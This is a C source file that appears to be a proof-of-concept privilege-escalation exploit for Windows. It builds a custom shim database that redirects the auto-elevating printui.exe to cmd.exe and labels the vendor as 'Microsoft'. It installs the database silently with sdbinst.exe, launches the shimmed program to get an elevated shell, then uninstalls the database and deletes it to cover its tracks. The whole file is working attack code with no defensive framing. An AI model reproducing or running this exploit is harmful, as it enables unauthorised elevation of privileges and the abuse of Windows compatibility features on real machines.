// main.c
 #include "Windows.h"  
 #include "stdio.h"  
 #include "apphelp.h"  
   
 BOOL LoadAppHelpFunctions(HMODULE hAppHelp, PAPPHELP_API pAppHelp) {  
      if(!(pAppHelp->SdbBeginWriteListTag =   
           (SdbBeginWriteListTagPtr)GetProcAddress(hAppHelp, "SdbBeginWriteListTag")))  
           return FALSE;  
      if(!(pAppHelp->SdbCloseDatabase =   
           (SdbCloseDatabasePtr)GetProcAddress(hAppHelp, "SdbCloseDatabase")))  
           return FALSE;  
      if(!(pAppHelp->SdbCloseDatabaseWrite =   
           (SdbCloseDatabaseWritePtr)GetProcAddress(hAppHelp, "SdbCloseDatabaseWrite")))  
           return FALSE;  
      if(!(pAppHelp->SdbCommitIndexes =   
           (SdbCommitIndexesPtr)GetProcAddress(hAppHelp, "SdbCommitIndexes")))  
           return FALSE;  
      if(!(pAppHelp->SdbCreateDatabase =   
           (SdbCreateDatabasePtr)GetProcAddress(hAppHelp, "SdbCreateDatabase")))  
           return FALSE;  
      if(!(pAppHelp->SdbDeclareIndex =   
           (SdbDeclareIndexPtr)GetProcAddress(hAppHelp, "SdbDeclareIndex")))  
           return FALSE;  
      if(!(pAppHelp->SdbEndWriteListTag =   
           (SdbEndWriteListTagPtr)GetProcAddress(hAppHelp, "SdbEndWriteListTag")))  
           return FALSE;  
      if(!(pAppHelp->SdbStartIndexing =   
           (SdbStartIndexingPtr)GetProcAddress(hAppHelp, "SdbStartIndexing")))  
           return FALSE;  
      if(!(pAppHelp->SdbStopIndexing =   
           (SdbStopIndexingPtr)GetProcAddress(hAppHelp, "SdbStopIndexing")))  
           return FALSE;  
      if(!(pAppHelp->SdbWriteBinaryTag =   
           (SdbWriteBinaryTagPtr)GetProcAddress(hAppHelp, "SdbWriteBinaryTag")))  
           return FALSE;  
      if(!(pAppHelp->SdbWriteDWORDTag =   
           (SdbWriteDWORDTagPtr)GetProcAddress(hAppHelp, "SdbWriteDWORDTag")))  
           return FALSE;  
      if(!(pAppHelp->SdbWriteQWORDTag =   
           (SdbWriteQWORDTagPtr)GetProcAddress(hAppHelp, "SdbWriteQWORDTag")))  
           return FALSE;  
      if(!(pAppHelp->SdbWriteStringTag =   
           (SdbWriteStringTagPtr)GetProcAddress(hAppHelp, "SdbWriteStringTag")))  
           return FALSE;  
   
      return TRUE;  
 }  
   
 int main(int argc, char *argv[]) {  
      HMODULE hAppHelp = LoadLibrary(L"apphelp.dll");  
      APPHELP_API api = {0};  
      INDEXID idx1, idx2, idx3, idx4, idx5, idx6, idx7, idx8, idx9;  
      TAGID tId1, tId2, tId3, tId4, tId5;  
      PDB db = NULL;  
      BYTE binBuff[] = {0x14, 0x7d, 0xe1, 0xd1, 0xbc, 0xca, 0x6f,   
           0x4f, 0x9f, 0x46, 0xc7, 0xec, 0xf8, 0x13, 0x64, 0x5e};  
      BYTE binBuff2[] = {0x13, 0x08, 0x37, 0x3a, 0x49, 0x21, 0x7d,   
           0x40, 0xb2, 0xcd, 0xee, 0x83, 0xdd, 0x35, 0x3d, 0x83};  
      WCHAR wszTempPath[MAX_PATH] = {0};  
      WCHAR wszUninstall[MAX_PATH] = {0};  
      SHELLEXECUTEINFO ShExec = {0};  
      ShExec.cbSize = sizeof(SHELLEXECUTEINFO);  
      ShExec.fMask = SEE_MASK_NOCLOSEPROCESS;  
      ShExec.hwnd = NULL;  
      ShExec.lpVerb = L"open";  
      ShExec.lpDirectory = NULL;  
      ShExec.hInstApp = NULL;  
   
      if(!LoadAppHelpFunctions(hAppHelp, &api)) {  
           wprintf(L"[-]Failed to load apphelp api!n");  
           return 1;  
      }  
   
      GetEnvironmentVariable(L"TEMP", wszTempPath, MAX_PATH);  
      wcscat_s(wszTempPath, MAX_PATH, L"\mydb.sdb");  
      db = api.SdbCreateDatabase(wszTempPath, DOS_PATH);  
      api.SdbDeclareIndex(db, TAG_TYPE_LIST, 24577, 1, TRUE, &idx1);  
      api.SdbDeclareIndex(db, TAG_TYPE_LIST, 24587, 0, FALSE, &idx2);  
      api.SdbDeclareIndex(db, TAG_TYPE_LIST, 24608, 0, FALSE, &idx3);  
      api.SdbDeclareIndex(db, 28676, 24577, 0, FALSE, &idx4);  
      api.SdbDeclareIndex(db, 28685, 16405, 0, FALSE, &idx5);  
      api.SdbDeclareIndex(db, 28688, 24577, 0, TRUE, &idx6);  
      api.SdbDeclareIndex(db, 28690, 36870, 0, FALSE, &idx7);  
      api.SdbDeclareIndex(db, 28690, 36868, 0, TRUE, &idx8);  
      api.SdbDeclareIndex(db, TAG_TYPE_LIST, 36868, 1, FALSE, &idx9);  
      api.SdbCommitIndexes(db);  
      tId1 = api.SdbBeginWriteListTag(db, 28673);  
      api.SdbWriteQWORDTag(db, 20481, 2900865542);  
      api.SdbWriteStringTag(db, 24610, L"2.1.0.3"); // Version  
      api.SdbWriteStringTag(db, 24577, L"badsdb"); // Custom shim database info  
      api.SdbWriteDWORDTag(db, 16419, 1);  
      api.SdbWriteBinaryTag(db, 36871, binBuff, 16);  
      tId2 = api.SdbBeginWriteListTag(db, 28674);  
      api.SdbStartIndexing(db, idx4);  
      api.SdbStopIndexing(db, idx4);  
      api.SdbStartIndexing(db, idx6);  
      api.SdbStopIndexing(db, idx6);  
      api.SdbEndWriteListTag(db, tId2);  
      api.SdbStartIndexing(db, idx2);  
      api.SdbStopIndexing(db, idx2);  
      api.SdbStartIndexing(db, idx3);  
      api.SdbStopIndexing(db, idx3);  
      api.SdbStartIndexing(db, idx1);  
      api.SdbStartIndexing(db, idx9);  
      tId3 = api.SdbBeginWriteListTag(db, 28679);  
      api.SdbWriteStringTag(db, 24577, L"printui.exe"); // Executable to be shimmed  
      api.SdbWriteStringTag(db, 24582, L"printui32.exe"); // Shim name  
      api.SdbWriteStringTag(db, 24581, L"Microsoft"); // Vendor  
      api.SdbWriteBinaryTag(db, 36868, binBuff2, 16);  
      tId4 = api.SdbBeginWriteListTag(db, 28680);  
      api.SdbWriteStringTag(db, 24577, L"*");  
      api.SdbEndWriteListTag(db, tId4);  
      tId5 = api.SdbBeginWriteListTag(db, 28681);  
      api.SdbWriteStringTag(db, 24577, L"RedirectEXE"); // Fix type  
      api.SdbWriteStringTag(db, 24584, L"c:\windows\system32\cmd.exe"); // Executable to redirect to  
      api.SdbEndWriteListTag(db, tId5);  
      api.SdbEndWriteListTag(db, tId3);  
      api.SdbStopIndexing(db, idx9);  
      api.SdbStopIndexing(db, idx1);  
      api.SdbStartIndexing(db, idx7);  
      api.SdbStartIndexing(db, idx8);  
      api.SdbStopIndexing(db, idx8);  
      api.SdbStopIndexing(db, idx7);  
      api.SdbStartIndexing(db, idx5);  
      api.SdbStopIndexing(db, idx5);  
      api.SdbEndWriteListTag(db, tId1);  
      api.SdbCloseDatabaseWrite(db);  
   
      ShExec.lpFile = L"sdbinst.exe";  
      ShExec.lpParameters = wszTempPath;  
      ShExec.nShow = SW_HIDE;  
      if(!ShellExecuteEx(&ShExec)) {  
           wprintf(L"[-]Failed to execute sdbinst.exe!n");  
           DeleteFile(wszTempPath);  
           return 1;  
      }  
      WaitForSingleObject(ShExec.hProcess, INFINITE);  
      ShExec.lpFile = L"printui.exe";  
      ShExec.lpParameters = NULL;  
      ShExec.nShow = SW_SHOWNORMAL;  
      if(!ShellExecuteEx(&ShExec)) {  
           wprintf(L"[-]Failed to execute shimmed printui.exe!n");  
           DeleteFile(wszTempPath);  
           return 1;  
      }  
      WaitForSingleObject(ShExec.hProcess, INFINITE);  
      wcscpy_s(wszUninstall, MAX_PATH, L"-u ");  
      wcscat_s(wszUninstall, MAX_PATH, wszTempPath);  
      ShExec.lpFile = L"sdbinst.exe";  
      ShExec.lpParameters = wszUninstall;  
      ShExec.nShow = SW_HIDE;  
      if(!ShellExecuteEx(&ShExec)) {  
           wprintf(L"[-]Failed to uninstall custom shim database!n");  
           DeleteFile(wszTempPath);  
           return 1;  
      }  
      WaitForSingleObject(ShExec.hProcess, INFINITE);  
      DeleteFile(wszTempPath);  
   
      return 0;  
 }  
